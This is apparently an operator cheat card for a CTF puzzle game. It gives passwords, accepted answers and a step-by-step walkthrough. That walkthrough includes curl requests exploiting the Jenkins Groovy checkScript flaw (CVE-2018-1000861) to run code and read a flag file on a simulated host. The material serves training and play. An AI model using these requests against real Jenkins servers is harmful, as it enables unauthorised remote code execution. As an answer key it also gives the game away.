# m0usunet-ctf — operator cheat card

Use this to play through the whole flow end-to-end. Repo-local, not
shipped to the v86 image.

## Boot

Open: `https://jackgrauer.github.io/m0usunet-ctf/?bust=<anything>`

Bump `bust=` to force a cache-fresh fetch when iterating.

## Flow + passwords

```
1. TASK 1 screen        (pre-auth: "proceed to Jefferson Park")
2. password prompt      → 4123       (IRL: handed out at the park)
3. name prompt          → any handle; blank = use the auto-generated one
4. Mouse Bites letter   (post-auth welcome + 4-task overview)
5. TASK 2 intro         → enter the m0usenet shell, do the puzzle
6. password prompt      → 4123       (IRL: handed out at HQ)
7. TASK 3 (culinary)
8. password prompt      → 4123       (IRL: gate to reflection)
9. TASK 4 (reflection)
10. ASSESSMENT COMPLETE
```

All three passwords are `4123` in the prototype.

## TASK 2 — Operation Parmesan Rose (digital phase)

**To advance any phase: just type the IP / hostname / CVE id / flag
string at the prompt and hit Enter. No keyword, no braces.**

`answer X` still works as a fallback (and `apply`, `submit`, `check`
are aliases for muscle memory).

You land in `/mnt/kit/01_nmap`.

### Phase 1 → nmap → find the back-office host

```
nmap 10.4.12.0/24
```

Look for the **one host with an extra `rDNS record for ...` line**
under its scan-report header. That's 10.4.12.88.

```
answer 10.4.12.88
```

Also accepted: `jenkins-old`, `jenkins-old.internal.crazy.ants`,
`legacy-build-03`, `legacy-build-03.crazy.ants`, `10.4.12.88:8080`,
`10.4.12.1:8080`.

### Phase 2 → nikto → fingerprint + CVE

```
cd /mnt/kit/02_nikto
nikto -h http://10.4.12.1:8080/
cat advisories
```

nikto reports `x-jenkins: 2.121.1`. In `advisories`, find the entry
matching that version that is **UNAUTH RCE** (everything else needs
auth, is info disclosure, or XSS).

```
answer CVE-2018-1000861
```

Also accepted: `CVE_2018_1000861`, lowercase variants,
`descriptorByName_unauth`.

### Phase 3 → curl → exploit + read blueprint

```
cd /mnt/kit/03_metasploit
cat README
```

Sanity check the unauth Groovy endpoint:

```
curl 'http://10.4.12.1:8080/jenkins/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?value=println(42)'
```

Expect: `Result: 42`. Then read the flag file:

```
curl 'http://10.4.12.1:8080/jenkins/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?value=new%20File(%22/var/m0use/blueprint.txt%22).text'
```

The flag is in the response. Submit:

```
answer jenkins_was_a_mistake
```

Then type `continue` (alias for `exit`) to leave the game shell and
return to the portal.

## TASK 4 — reflection

Four sections; press ENTER on a blank line to advance each. Any
text works.

## In-shell helpers

```
help              command reference
cat hint          current phase's hint
cat README        current phase's long-form notes
restart           nuke portal state, restart from cold-open
continue          leave the game shell (alias for exit)
```

## Local dry-run (no v86, no browser)

```
./build/dryrun.sh
```

Runs the portal flow against a tmpdir for state. Game subshell is
skipped unless you point `PORTAL_RC` at a real game-rc.
